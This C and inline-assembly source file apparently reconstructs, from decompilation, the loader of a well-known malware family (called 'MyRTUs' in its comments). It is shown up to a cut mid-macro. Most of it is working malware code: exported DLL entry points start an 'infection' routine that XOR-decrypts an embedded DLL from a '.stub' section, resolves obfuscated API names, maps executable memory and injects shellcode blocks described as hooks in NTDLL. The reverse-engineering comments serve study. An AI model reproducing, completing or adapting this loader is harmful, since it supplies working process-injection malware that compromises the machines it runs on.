/******************************************************************************************
  Copyright 2012 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "data.h"

void __ASM_BLOCK0_0(void);
void __ASM_BLOCK0_1(void);
void __ASM_BLOCK0_2(void);

void __ASM_BLOCK1_0(void);
void __ASM_BLOCK1_1(void);
void __ASM_BLOCK1_2(void);
void __ASM_BLOCK1_3(void);
void __ASM_BLOCK1_4(void);
void __ASM_BLOCK1_5(void);
void __ASM_BLOCK1_6(void);

void __ASM_REF_3(void);
void __ASM_REF_4(void);
void __ASM_REF_5(void);
void __ASM_REF_6(void);
void __ASM_REF_7(void);

extern const HMODULE NTDLL_DLL;

extern const _tlstrcmpiW             _lstrcmpiW;
extern const _tVirtualQuery          _VirtualQuery;
extern const _tVirtualProtect        _VirtualProtect;
extern const _tGetProcAddress        _GetProcAddress;
extern const _tMapViewOfFile         _MapViewOfFile;
extern const _tUnmapViewOfFile       _UnmapViewOfFile;
extern const _tFlushInstructionCache _FlushInstructionCache;
extern const _tLoadLibraryW          _LoadLibraryW;
extern const _tFreeLibrary           _FreeLibrary;
extern const _tZwCreateSection       _ZwCreateSection;
extern const _tZwMapViewOfSection    _ZwMapViewOfSection;
extern const _tCreateThread          _CreateThread;
extern const _tWaitForSingleObject   _WaitForSingleObject;
extern const _tGetExitCodeThread     _GetExitCodeThread;
extern const _tZwClose               _ZwClose;

void StartInfection(void);

void DecryptRVASection(char *pSectionRVA, unsigned int pSectionVirtualSize);
int  LocateRVASection(int *pSectionRVA, int *pSectionVirtualSize);

void CheckSystemVersion(_DWORD _unused);
void UnusedFunction();
int __thiscall DecodeEncryptedModuleNames(DWORD dwOld);
int _ZwOpenMapView(HANDLE ZwModuleProcessHandle, int ZwSectionSize, PHANDLE ZwSectionHandle, PVOID *ZwCurrentProcessBaseAddress, PVOID *ZwModuleProcessBaseAddress);
void _ZwMoveSectionPointer(void **ZwSectionAddr1, void *ZwSectionAddr2, int *ZwSectionPointer, int *ZwInformation, const void *ZwSectionContent, unsigned int ZwSectionSize);
int GetRandomModuleName(int *sModuleInfo, LPCWSTR szRandomLibraryName);
int _ZwReplaceSection(HANDLE hProcessHandle, const void *sModuleInfo, const void *InSection2, unsigned int InSize2, int a5, const void *InSection1, unsigned int InSize1, void **OutPointer);

int sub_100016A5(int a1, void *a2, const void *a3);

UINT32 GetNTDLLCodeShellcodeSize(void);
UINT32 GetNTDLLCodeShellcode(void);
UINT32 GetRealtivePositionOfFunc1(void);
UINT32 GetRealtivePositionOfFunc3(void);

int InfectModuleNTDLL(HANDLE hHandle, void *a2, int *pInjectedCode, int *a4);
int InfectSystem(LPCWSTR szRandomModuleName, const void *pPE, unsigned int iSize, HMODULE *a4);

void DecodeModuleNameA(const char *pEncodedFunctionName, char *pDecodedFunctionName);
void DecodeModuleNameW(const WCHAR *pEncodedModuleName, WCHAR *pDecodedModuleName);

HMODULE GetModuleNTDLL();
FARPROC GetFunctionFromModule(const WCHAR *pEncodedModuleName, const char *pEncodedFunctionName);

void __memcpy(void *Dst, const void *Src, size_t Size);

FARPROC GetFunctionFromKERNEL32(const char *pEncodedFunctionName);
FARPROC GetFunctionFromNTDLL(const char *pEncodedFunctionName);

int NTDLL_CODE_SHELLCODE_INIT(int a1);
int __stdcall NTDLL_CODE_SHELLCODE_FUNC1(int a1);
void NTDLL_CODE_SHELLCODE_FUNC2(_DWORD, _DWORD, _DWORD);
int __stdcall NTDLL_CODE_SHELLCODE_FUNC3(int a1);
void NTDLL_CODE_SHELLCODE_FUNC4(void *a1, const void *a2, unsigned int a3);
void NTDLL_CODE_SHELLCODE_FUNC5(const void *a1, int a2, void *a3);
_DWORD NTDLL_CODE_SHELLCODE_FUNC6(_DWORD, _DWORD);
int NTDLL_CODE_SHELLCODE_FUNC7(int a1, int a2, const void *a3, int a4);
void NTDLL_CODE_SHELLCODE_END(void);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	if(fdwReason && fdwReason == 1) hINSTANCE = hinstDLL;
	return TRUE;
}

STDAPI DllUnregisterServerEx(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	if(fdwReason && fdwReason == 1)
	{
		hINSTANCE = hinstDLL;
		CheckSystemVersion(1);
	}
	
	return 0;
}

STDAPI DllCanUnloadNow(void)
{
	hINSTANCE = GetModuleHandleW(0);
	CheckSystemVersion(1);
	ExitProcess(0);
}

STDAPI DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv)
{
	CheckSystemVersion(1);
}

BOOL WINAPI DllRegisterServerEx(void)
{
	CheckSystemVersion(1);
	return TRUE;
}

STDAPI CPlApplet(int a1)
{
	if(*(_DWORD *)(a1 + 8))
		DeleteFileA(*(LPCSTR *)(a1 + 8));
	CheckSystemVersion(1);
	return 1;
}

STDAPI DllGetClassObjectEx(int a1, int a2, int a3, int a4)
{
	CheckSystemVersion(0);
}

/*************************************************************************
** Here the executable start to infect the system with the decryption   **
** of the dll and its execution in the memory.                          **
*************************************************************************/
void StartInfection(void)
{
	__tMainModuleInit pMainModuleInit; // eax@3
	int pSectionVirtualSize; // [sp+0h] [bp-Ch]@1
	int pSectionRVA; // [sp+4h] [bp-8h]@1
	HMODULE hLibModule; // [sp+8h] [bp-4h]@2

	/* --->> Get the ".stub" section's RVA and Virtual Sizee <<--- */
	if(!LocateRVASection(&pSectionRVA, &pSectionVirtualSize)) return;
	
	
	/* --->> Start to decrypt from the 552 byte <<--- */
	/* --->> Decrypt 49.8176 bytes <<--- */
	DecryptRVASection((char *)(pSectionRVA + *(_DWORD *)pSectionRVA), *(_DWORD *)(pSectionRVA + 4));// (552, 498176)
	if(!InfectSystem(NULL, (const void *)(pSectionRVA + *(_DWORD *)pSectionRVA), *(_DWORD *)(pSectionRVA + 4), &hLibModule)) // (0, 552, 498176, ...)
	{
		pMainModuleInit = (__tMainModuleInit)GetProcAddress(hLibModule, (LPCSTR)0xF);
		if(pMainModuleInit) pMainModuleInit(pSectionRVA, pSectionVirtualSize);
		
		FreeLibrary(hLibModule);
	}
}

/*************************************************************************
** A simple XOR algorithm used to decrypt the encrypted dll located in  **
** the .stub section.                                                   **
*************************************************************************/
void DecryptRVASection(char *pSectionRVA, unsigned int pSectionVirtualSize)
{
	unsigned int iFirstXOR; // edx@2
	unsigned int iSecondXOR; // eax@4
	unsigned int i;
	signed int iTotalCycles; // [sp+8h] [bp-8h]@1
	unsigned int iCyclesSecondXOR; // [sp+Ch] [bp-4h]@1

	iCyclesSecondXOR = pSectionVirtualSize >> 1;
	iTotalCycles = 4;
	do
	{
		iFirstXOR = 0;
		if(pSectionVirtualSize)
		{
			do
			{
				pSectionRVA[iFirstXOR] ^= -106 * iFirstXOR;
				++iFirstXOR;
			}
			while(iFirstXOR < pSectionVirtualSize);
		}
		iSecondXOR = 0;
		if(iCyclesSecondXOR)
		{
			do
			{
				pSectionRVA[iSecondXOR] ^= *(&pSectionRVA[(pSectionVirtualSize + 1) >> 1] + iSecondXOR);
				++iSecondXOR;
			}
			while(iSecondXOR < iCyclesSecondXOR);
		}
		
		for(i = pSectionVirtualSize - 1; i >= 1; --i)
			pSectionRVA[i] -= pSectionRVA[i - 1];
		
		--iTotalCycles;
	}
	while(iTotalCycles >= 0);
}

/*************************************************************************
** This function search the section ".stub" where the encrypted dll is  **
** placed, it searchs the Relativa Virtual Address (RVA) and its        **
** Virtual Size, then it checks for the integrity of the section with   **
** an header. If all it's ok return TRUE, otherwise return FALSE.       **
*************************************************************************/
BOOL LocateRVASection(int *pSectionRVA, int *pSectionVirtualSize)
{
	char *v3; // esi@3
	char *iSectionsPTR; // edi@5
	signed int iCurrentSection; // ebx@5
	unsigned int iSectionVirtualSize; // ecx@10
	int iSectionRVA; // eax@11

	/* --->> Check executable header "MZ" <<--- */
	if(*(_WORD *)hINSTANCE != MZ_HEADER) return FALSE;
	
	/* --->> Get the address of the new executable header (hINSTANCE + 240) <<--- */
	v3 = *((_DWORD *)hINSTANCE + 15) + (char *)hINSTANCE;
	
	/* --->> Check new executable header "PE" <<--- */
	if(*(_DWORD *)v3 != PE_HEADER) return FALSE;
	
	/* --->> Get the address of the PE Section Table (PE header + 224 + 24) <<--- */
	iSectionsPTR = &v3[24 + *((_WORD *)v3 + 10)];
	iCurrentSection = 0;
	
	/* --->> Get the number of sections (5), if it is 0 or negative the function failed <<--- */
	if(*((_WORD *)v3 + 3) <= 0) return FALSE;
	
	/* --->> Search the section ".stub" where the encrypted dll is allocated, if not found the function failed <<--- */
	while(lstrcmpiA(iSectionsPTR, ".stub"))
	{
		++iCurrentSection;
		iSectionsPTR += 40; // Next section
		
		if(iCurrentSection >= *((_WORD *)v3 + 3)) return FALSE;
	}
	
	iSectionVirtualSize = *((_DWORD *)iSectionsPTR + 2);// Get the ".stub" section Virtual Size (503.808 bytes)
	
	/* --->> Check if the Virtual Size is not too small (VirtualSize >= 556)             <<--- */
	/* --->> Get the ".stub" section RVA (Relative Virtual Address) (hINSTANCE + 0x6000) <<--- */
	/* --->> Check the header (DWORD) of the RVA section (0xAE39120D)                    <<--- */
	if(iSectionVirtualSize >= 0x22C && (iSectionRVA = (int)((char *)hINSTANCE + *((_DWORD *)iSectionsPTR + 3)), *(_DWORD *)iSectionRVA == 0xAE39120D))
	{
		/* --->> Remove the header (4 bytes) and put the values in the pointers <<--- */
		*pSectionRVA = iSectionRVA + 4;
		*pSectionVirtualSize = iSectionVirtualSize - 4;
		
		return TRUE;
	}
	
	return FALSE;
}

/*************************************************************************
** This function check that the system is not too old or too new,       **
** it works with all the versions of Windows from Windows 2000 to       **
** Windows 8 included, in the asm code the function is called with a    **
** value (0 and 1) but actually it is not used, maybe it was used in    **
** the past.                                                            **
*************************************************************************/
void CheckSystemVersion(_DWORD a1)
{
	struct _OSVERSIONINFOW VersionInformation; // [sp+0h] [bp-114h]@1

	VersionInformation.dwOSVersionInfoSize = 276;
	
	if(GetVersionExW(&VersionInformation)
	&& VersionInformation.dwPlatformId == 2
	&& (VersionInformation.dwMajorVersion >= 5 || VersionInformation.dwMajorVersion <= 6))
		StartInfection();
}

/*************************************************************************
** Currently this function is unused, maybe it was used in the past     **
** versions of MyRTUs, but in any case I don't understand its function. **
*************************************************************************/
void __declspec(naked) UnusedFunction()
{
	__asm
	{
		push    ecx
		lea     ecx, [esp+4]
		sub     ecx, eax
		sbb     eax, eax
		not     eax
		and     ecx, eax
		mov     eax, esp
		and     eax, 0FFFFF000h

__ASM_REF_0:
		cmp     ecx, eax
		jb      short __ASM_REF_1
		mov     eax, ecx
		pop     ecx
		xchg    eax, esp
		mov     eax, [eax]
		mov     [esp+0], eax
		retn

__ASM_REF_1:
		sub     eax, 1000h
		test    [eax], eax
		jmp     short __ASM_REF_0
	}
}

/*************************************************************************
** This function decode the encrypted names of the modules NTDLL.dll    **
** and Kernel32.dll and their own functions. Then it moves the pointer  **
** of the functions, obtained with GetProcAddress() in the their        **
** relative variable, after that the function are hooked (?) according  **
** to the Kaspersky Lab and Symantec reports.                           **
*************************************************************************/
BOOL DecodeEncryptedModuleNames(DWORD dwOld)
{
	DWORD _dwOld; // [sp+0h] [bp-4h]@1

	_dwOld = dwOld;
	if(VirtualProtect((LPVOID)&NTDLL_DLL, 0x44u, 0x80u, &_dwOld) || VirtualProtect((LPVOID)&NTDLL_DLL, 0x44u, 0x40u, &_dwOld))
	{
		*(HMODULE*)NTDLL_DLL = GetModuleNTDLL();
		
		*(UINT32*)_lstrcmpiW             = (UINT32)GetFunctionFromKERNEL32(ENCODED_lstrcmpiW);
		*(UINT32*)_VirtualQuery          = (UINT32)GetFunctionFromKERNEL32(ENCODED_VirtualQuery);
		*(UINT32*)_VirtualProtect        = (UINT32)GetFunctionFromKERNEL32(ENCODED_VirtualProtect);
		*(UINT32*)_GetProcAddress        = (UINT32)GetFunctionFromKERNEL32(ENCODED_GetProcAddress);
		*(UINT32*)_MapViewOfFile         = (UINT32)GetFunctionFromKERNEL32(ENCODED_MapViewOfFile);
		*(UINT32*)_UnmapViewOfFile       = (UINT32)GetFunctionFromKERNEL32(ENCODED_UnmapViewOfFile);
		*(UINT32*)_FlushInstructionCache = (UINT32)GetFunctionFromKERNEL32(ENCODED_FlushInstructionCache);
		*(UINT32*)_LoadLibraryW          = (UINT32)GetFunctionFromKERNEL32(ENCODED_LoadLibraryW);
		*(UINT32*)_FreeLibrary           = (UINT32)GetFunctionFromKERNEL32(ENCODED_FreeLibrary);
		*(UINT32*)_ZwCreateSection       = (UINT32)GetFunctionFromNTDLL(ENCODED_ZwCreateSection);
		*(UINT32*)_ZwMapViewOfSection    = (UINT32)GetFunctionFromNTDLL(ENCODED_ZwMapViewOfSection);
		*(UINT32*)_CreateThread          = (UINT32)GetFunctionFromKERNEL32(ENCODED_CreateThread);
		*(UINT32*)_WaitForSingleObject   = (UINT32)GetFunctionFromKERNEL32(ENCODED_WaitForSingleObject);
		*(UINT32*)_GetExitCodeThread     = (UINT32)GetFunctionFromKERNEL32(ENCODED_GetExitCodeThread);
		*(UINT32*)_ZwClose               = (UINT32)GetFunctionFromNTDLL(ENCODED_ZwClose);
		
		return TRUE;
	}
	
	return FALSE;
}

/*************************************************************************
** Unknown function.                                                    **
*************************************************************************/
int _ZwOpenMapView(HANDLE ZwModuleProcessHandle, int ZwSectionSize, PHANDLE ZwSectionHandle, PVOID *ZwCurrentProcessBaseAddress, PVOID *ZwModuleProcessBaseAddress)
{
	PSIZE_T ZwViewSize; // [sp+0h] [bp-10h]@1
	NTSTATUS ZwStatus; // [sp+4h] [bp-Ch]@3
	LARGE_INTEGER ZwMaximumSize; // [sp+8h] [bp-8h]@1

	ZwViewSize = (PSIZE_T)ZwSectionSize;
	
	ZwMaximumSize.LowPart  = ZwSectionSize;
	ZwMaximumSize.HighPart = 0;
	
	// (..., 0xF001F, 0, ..., 64, 0x8000000, 0)
	if(_ZwCreateSection(ZwSectionHandle, SECTION_ALL_ACCESS, 0, &ZwMaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0) != STATUS_SUCCESS) return -5;
	
	// (..., ..., ..., 0, 0, 0, ..., 1, 0, 64)
	ZwStatus = _ZwMapViewOfSection(*(HANDLE *)ZwSectionHandle, GetCurrentProcess(), ZwCurrentProcessBaseAddress, 0, 0, 0, (PSIZE_T)&ZwViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
	if(ZwStatus != STATUS_SUCCESS) return -5;
	
	// (..., ..., ..., 0, 0, 0, ..., 1, 0, 64)
	ZwStatus = _ZwMapViewOfSection(*(HANDLE *)ZwSectionHandle, ZwModuleProcessHandle, ZwModuleProcessBaseAddress, 0, 0, 0, (PSIZE_T)&ZwViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
	if(ZwStatus != STATUS_SUCCESS) return -5;
	
	return 0;
}

/*************************************************************************
** Unknown function.                                                    **
*************************************************************************/
void _ZwMoveSectionPointer(void **ZwSectionAddr1, void *ZwSectionAddr2, int *ZwSectionPointer, int *ZwInformation, const void *ZwSectionContent, unsigned int ZwSectionSize)
{
	if(ZwSectionSize) __memcpy(*ZwSectionAddr1, ZwSectionContent, ZwSectionSize);

	ZwInformation[0] = (int)((char *)ZwSectionAddr2 + *ZwSectionPointer); // Old ZwSectionAddr2 pointer &ZwSectionAddr2[ZwSectionPointer]
	ZwInformation[1] = ZwSectionSize;						              // Size of the new section
	*ZwSectionAddr1 = (char *)*ZwSectionAddr1 + ZwSectionSize;
	*ZwSectionPointer = ZwSectionSize + *ZwSectionPointer;
}

/*************************************************************************
** This function generate a random name for the dll in the format       **
** KERNEL32.DLL.ASLR.%08x, it also accepts a name passed through the    **
** paramter "szRandomLibraryName", but actually it set to NULL and it's **
** not used, probably it was a feature used in the past versions.       **
*************************************************************************/
int GetRandomModuleName(int *sModuleInfo, LPCWSTR szRandomLibraryName)
{
	WCHAR __KERNEL32_DLL_ASLR_08x[42]; // [sp+8h] [bp-58h]@5
	DWORD iRandom; // [sp+5Ch] [bp-4h]@5

	if(szRandomLibraryName)
	{
		if(lstrlenW(szRandomLibraryName) >= 31) return -1;
		lstrcpyW((LPWSTR)sModuleInfo + 8, szRandomLibraryName);
	}
	else
	{
		iRandom = GetTickCount() + 3 * GetCurrentThreadId();
		DecodeModuleNameW((WCHAR *)ENCODED_KERNEL32_DLL_ASLR__08x, __KERNEL32_DLL_ASLR_08x);
		
		do
			wsprintfW((LPWSTR)sModuleInfo + 8, __KERNEL32_DLL_ASLR_08x, iRandom++);
		while(GetModuleHandleW((LPCWSTR)sModuleInfo + 8));
	}
	
	sModuleInfo[0] = (UINT32)sModuleInfo ^ 0xAE1979DD;
	sModuleInfo[1] = 0;
	sModuleInfo[3] = (UINT32)NTDLL_CODE_SHELLCODE_FUNC3;
	
	return 0;
}

/*************************************************************************
** Unknown function.                                                    **
*************************************************************************/
int _ZwReplaceSection(HANDLE hProcessHandle, const void *sModuleInfo, const void *InSection2, unsigned int InSize2, int a5, const void *InSection1, unsigned int InSize1, void **OutPointer)
{
	HANDLE hMapHandle; // [sp+4h] [bp-28h]@1
	char *NewSectionPointer1; // [sp+8h] [bp-24h]@3
	int v11; // [sp+Ch] [bp-20h]@6
	int BaseSectionPointer; // [sp+10h] [bp-1Ch]@1
	void *SectionPointer1; // [sp+14h] [bp-18h]@1
	void *NewSectionPointer2; // [sp+18h] [bp-14h]@3
	unsigned int TotalSize; // [sp+1Ch] [bp-10h]@1
	void *SectionPointer2; // [sp+20h] [bp-Ch]@1
	int *GeneralSectionPointer; // [sp+24h] [bp-8h]@3
	int iOpenMapiFailed; // [sp+28h] [bp-4h]@1

	SectionPointer1 = 0;
	SectionPointer2 = 0;
	
	BaseSectionPointer = 0;
	
	TotalSize = InSize2 + InSize1 + 152;
	
	iOpenMapiFailed = _ZwOpenMapView(hProcessHandle, TotalSize, &hMapHandle, &SectionPointer1, &SectionPointer2);
	if(iOpenMapiFailed) return iOpenMapiFailed;
	
	GeneralSectionPointer = (int *)SectionPointer1;
	SectionPointer1 = (char *)SectionPointer1 + 152;
	BaseSectionPointer = 152;
	
	_ZwMoveSectionPointer(&SectionPointer1, SectionPointer2, &BaseSectionPointer, GeneralSectionPointer + 33, InSection1, InSize1);
	NewSectionPointer1 = (char *)SectionPointer1;
	
	_ZwMoveSectionPointer(&SectionPointer1, SectionPointer2, &BaseSectionPointer, GeneralSectionPointer + 35, InSection2, InSize2);
	NewSectionPointer2 = NewSectionPointer1;
	
	if(InSize2 >= 0x1000 && *(_WORD *)NewSectionPointer2 == 0x5A4D && *((_DWORD *)NewSectionPointer2 + 15) + 248 < InSize2)
	{
		v11 = (int)&NewSectionPointer1[*((_DWORD *)NewSectionPointer2 + 15)];
		if(*(_DWORD *)(v11 + 204) == 72) *(_DWORD *)(v11 + 204) = 64;
	}
	
	__memcpy(GeneralSectionPointer, sModuleInfo, 0x80);
	
	GeneralSectionPointer[37] = a5;
	GeneralSectionPointer[32] = 0;
	
	*OutPointer = SectionPointer2;
	
	_UnmapViewOfFile(GeneralSectionPointer);
	_ZwClose(hMapHandle);

	return 0;
}

/*************************************************************************
** Unknown function.                                                    **
*************************************************************************/
int sub_100016A5(int a1, void *a2, const void *a3)
{
	int v4; // [sp+0h] [bp-90h]@5
	int v5; // [sp+4h] [bp-8Ch]@7
	signed int v6; // [sp+8h] [bp-88h]@1
	unsigned int v7; // [sp+Ch] [bp-84h]@1
	unsigned int Dst[32]; // [sp+10h] [bp-80h]@1

	__memcpy(Dst, a3, 128);
	
	Dst[0] ^= 0xAE1979DD;
	Dst[1] = 0;
	
	v7 = (UINT32)&NTDLL_DLL + *(_DWORD *)(a1 + 8) - (UINT32)&__ASM_BLOCK1_0;
	
	v6 = NTDLL_CODE_SHELLCODE_FUNC7(v7, (int)&Dst, *((const void **)a2 + 35), *((_DWORD *)a2 + 36));
	if(v6) return v6;
	
	if(NTDLL_CODE_SHELLCODE_FUNC6(a1, v7)) return -4;
	
	v4 = (*(int (__stdcall **)(_DWORD))(v7 + 36))((_DWORD)&Dst[4]);
	if(!v4) return -9;
	
	*((_DWORD *)a2 + 32) = v4;
	v5 = Dst[2];
	
	if(Dst[2])
	{
		Dst[2] = 0;
		(*(void (__stdcall **)(int))(v7 + 64))(v5);
	}
	
	return 0;
}

/*************************************************************************
** Function which returns the total size of the functions to inject in  **
** the NTDLL.dll (?) according to the Kaspersky Lab and Symantec        **
** reports.                                                             **
*************************************************************************/
UINT32 GetNTDLLCodeShellcodeSize(void)
{
	return (UINT32)&NTDLL_CODE_SHELLCODE_END - (UINT32)&NTDLL_CODE_SHELLCODE_INIT;// (0x100026A8 - 0x10002060) = 0x648 ---> [1608]
}

/*************************************************************************
** This function returns the pointer to the first function that will be **
** injected in the NTDLL.dll (?) according to the Kaspersky Lab and     **
** Symantec reports.                                                    **
*************************************************************************/
UINT32 GetNTDLLCodeShellcode(void)
{
	return (UINT32)&NTDLL_CODE_SHELLCODE_INIT;
}

/*************************************************************************
** This function returns the pointer to the second function that will   **
** be injected in the NTDLL.dll (?) according to the Kaspersky Lab and  **
** Symantec reports.                                                    **
*************************************************************************/
UINT32 GetRealtivePositionOfFunc1(void)
{
	return (UINT32)&NTDLL_CODE_SHELLCODE_FUNC1 - (UINT32)&NTDLL_CODE_SHELLCODE_INIT;
}

/*************************************************************************
** This function returns the pointer to the fourth function that will   **
** be injected in the NTDLL.dll (?) according to the Kaspersky Lab and  **
** Symantec reports.                                                    **
*************************************************************************/
UINT32 GetRealtivePositionOfFunc3(void)
{
	return (UINT32)&NTDLL_CODE_SHELLCODE_FUNC3 - (UINT32)&NTDLL_CODE_SHELLCODE_INIT;
}

/*************************************************************************
** Unknown function. Probably it is the function that inject the new    **
** code in the NTDLL.dll (?) according to the Kaspersky Lab and         **
** Symantec reports.                                                    **
*************************************************************************/
int InfectModuleNTDLL(HANDLE hHandle, void *a2, int *pInjectedCode, int *a4)
{
	void *pShellcode; // eax@3
	HANDLE pSectionHandle; // [sp+8h] [bp-28h]@1
	int iPointerCodeShell; // [sp+Ch] [bp-24h]@3
	int *v9; // [sp+10h] [bp-20h]@3
	int iPointer; // [sp+14h] [bp-1Ch]@1
	void *pCurrentProcessBaseAddr; // [sp+18h] [bp-18h]@1
	unsigned int v12; // [sp+1Ch] [bp-14h]@1
	void *pModuleProcessBaseAddr; // [sp+20h] [bp-10h]@1
	int *pCurrentProcessMapView; // [sp+24h] [bp-Ch]@3
	unsigned int iShellcodeSize; // [sp+28h] [bp-8h]@1
	int iOpenMapViewFailed; // [sp+2Ch] [bp-4h]@1

	pCurrentProcessBaseAddr = 0;
	pModuleProcessBaseAddr = 0;
	
	// var_30 = (0x10001F5E - 0x10001AB9) --> [0x04A5]
	// var_2C = (0x10001AB9 - 0x10001A90) --> [0x0029]
	// var_8  = GetNTDLLCodeShellcodeSize --> [0x648]
	// lea eax, [var_30 + var_2C + 0x24] ---> [0x04F2]
	// add eax, var_8 -----> [0xB3A] (2874)
	// So, the final result is 2874
	
	iShellcodeSize = GetNTDLLCodeShellcodeSize();
	v12 = iShellcodeSize + (UINT32)&DecodeModuleNameA - (UINT32)&__ASM_BLOCK1_0 + (UINT32)&__ASM_BLOCK1_0 - (UINT32)&__ASM_BLOCK0_0 + 36; // 2874
	
	iPointer = 0;
	
	iOpenMapViewFailed = _ZwOpenMapView(hHandle, v12, &pSectionHandle, &pCurrentProcessBaseAddr, &pModuleProcessBaseAddr);
	if(iOpenMapViewFailed != STATUS_SUCCESS) return iOpenMapViewFailed;
	
	
	pCurrentProcessMapView = (int *)pCurrentProcessBaseAddr;
	pCurrentProcessBaseAddr = (char *)pCurrentProcessBaseAddr + 36;
	
	iPointer = 36;
	
	// Inject a new table into the NTDLL code (__ASM_BLOCK1_0)
	// &DecodeModuleNameA - &__ASM_BLOCK1_0 = [0x04A5] (1189)
	_ZwMoveSectionPointer(&pCurrentProcessBaseAddr, pModuleProcessBaseAddr, &iPointer, pCurrentProcessMapView + 2, __ASM_BLOCK1_0, (UINT32)&DecodeModuleNameA - (UINT32)&__ASM_BLOCK1_0);
	
	iPointerCodeShell = iPointer;
	
	// Inject the shellcode into the NTDLL header (__ASM_BLOCK0_0)
	// &__ASM_BLOCK1_0 - &__ASM_BLOCK0_0 = [0x0029] (41)
	_ZwMoveSectionPointer(&pCurrentProcessBaseAddr, pModuleProcessBaseAddr, &iPointer, pCurrentProcessMapView + 6, __ASM_BLOCK0_0, (UINT32)&__ASM_BLOCK1_0 - (UINT32)&__ASM_BLOCK0_0);
	
	pShellcode = (void *)GetNTDLLCodeShellcode();
	
	// Inject the shellcode into the NTDLL code (NTDLL_CODE_SHELLCODE_INIT to NTDLL_CODE_SHELLCODE_END)
	// NTDLL_CODE_SHELLCODE_INIT to NTDLL_CODE_SHELLCODE_END = [0xB3A] (2874)
	_ZwMoveSectionPointer(&pCurrentProcessBaseAddr, pModuleProcessBaseAddr, &iPointer, pCurrentProcessMapView + 4, pShellcode, iShellcodeSize);
	
	// Uknown
	v9 = (int *)((UINT32)&pCurrentProcessMapView + (UINT32)&iPointerCodeShell + (UINT32)&__ASM_BLOCK0_1 - (UINT32)&__ASM_BLOCK0_0);
	*v9 = (UINT32)&pCurrentProcessMapView[2] + (UINT32)&__ASM_REF_3 - (UINT32)&__ASM_BLOCK1_0;
	
	// Uknown
	pCurrentProcessMapView[0] = (UINT32)&pCurrentProcessMapView[4] + GetRealtivePositionOfFunc1();
	pCurrentProcessMapView[1] = (UINT32)&pCurrentProcessMapView[4] + GetRealtivePositionOfFunc3();
	pCurrentProcessMapView[8] = (int)a2;
	
	// Put the values in the pointers
	*pInjectedCode = pCurrentProcessMapView[4]; // Pointer to the injected shellcode in the code
	*a4 = (int)pModuleProcessBaseAddr;
	
	// Close and unmap
	_UnmapViewOfFile(pCurrentProcessMapView);
	_ZwClose(pSectionHandle);
	
	return 0;
}

/*************************************************************************
** This function generate the random name for the encrypted dll and     **
** inject the code into NTDLL.DLL.                                      **
*************************************************************************/
int InfectSystem(LPCWSTR szRandomModuleName, const void *pPE, unsigned int iSize, HMODULE *a4)
{
	DWORD v8; // [sp-4h] [bp-88h]@1
	int v9; // [sp+0h] [bp-84h]@5
	int sModuleInfo[32]; // [sp+4h] [bp-80h]@1

	// Get a random module name with the format "KERNEL32.DLL.ASLR.XXXXXXXX"
	if(!GetRandomModuleName(sModuleInfo, szRandomModuleName) == 0) return 0;
	
	// Decrypt the Kernel32's and NTDLL's function names
	if(bSetup && !DecodeEncryptedModuleNames(v8)) return -12;
	
	v9 = _ZwReplaceSection(GetCurrentProcess(), sModuleInfo, pPE, iSize, -1, 0, 0, &pProcessMapView);
	if(v9) return v9;
	
	if(bSetup)
	{
		v9 = InfectModuleNTDLL(GetCurrentProcess(), pProcessMapView, &pInjectedCodeNTDLL, &pProcessBaseAddress);
		if(v9) return v9;
		
		bSetup = 0;
	}
	
	// Unknown
	v9 = sub_100016A5(pProcessBaseAddress, pProcessMapView, sModuleInfo);
	if(!v9) *a4 = (HMODULE)*((_DWORD *)pProcessMapView + 32);
	
	_UnmapViewOfFile(pProcessMapView);
	
	return v9;
}

#pragma code_seg(".text")
#define A_TEXT __declspec(allocate(".text"))

/*************************************************************************
** ASSEMBLY BLOCK 0.                                                    **
*************************************************************************/

void __declspec(naked) __ASM_BLOCK0_0(void)
{
	__asm
	{
		cmp     edx, [eax]
		dec     ecx
		stosd

		mov     dl, 0
		jmp     short __ASM_REF_0
		
		mov     dl, 1
		jmp     short __ASM_REF_0
		
		mov     dl, 2
		jmp     short __ASM_REF_0
		
		mov     dl, 3
		jmp     short __ASM_REF_0
		
		mov     dl, 4
		jmp     short __ASM_REF_0
		
		mov     dl, 5
		jmp     short $+2
		
	__ASM_REF_0:
		push    edx
		call    __ASM_BLOCK0_2
	}
}

void __declspec(naked) __ASM_BLOCK0_1(void)
{
	__asm
	{
		xchg    ebx, [ebx+0]
		add     [eax], dl
	}
}

void __declspec(naked) __ASM_BLOCK0_2(void)
{
	__asm
	{
		pop     edx
		jmp     dword ptr [edx]
	}
}

/*************************************************************************
** ASSEMBLY BLOCK 1.                                                    **
*************************************************************************/                                    

#define ASM_EMIT __asm _emit

#define ASM_ZwMapViewOfSection \
	ASM_EMIT 'Z' ASM_EMIT 'w' ASM_EMIT 'M' ASM_EMIT 'a' ASM_EMIT 'p' ASM_EMIT 'V' ASM_EMIT 'i' ASM_EMIT 'e' ASM_EMIT 'w'  ASM_EMIT 'O' ASM_EMIT 'f' ASM_EMIT 'S' ASM_EMIT 'e' ASM_EMIT 'c' ASM_EMIT 't' ASM_EMIT 'i' ASM_EMIT 'o' ASM_EMIT 'n' ASM_EMIT '\0'

#define ASM_ZwCreateSection \
	ASM_EMIT 'Z' ASM_EMIT 'w' ASM_EMIT 'C' ASM_EMIT 'r' ASM_EMIT 'e' ASM_EMIT 'a' ASM_EMIT 't' ASM_EMIT 'e' ASM_EMIT 'S' ASM_EMIT 'e' ASM_EMIT 'c' ASM_EMIT 't' ASM_EMIT 'i' ASM_EMIT 'o' ASM_EMIT 'n' ASM_EMIT '\0'

#define ASM_ZwOpenFile \
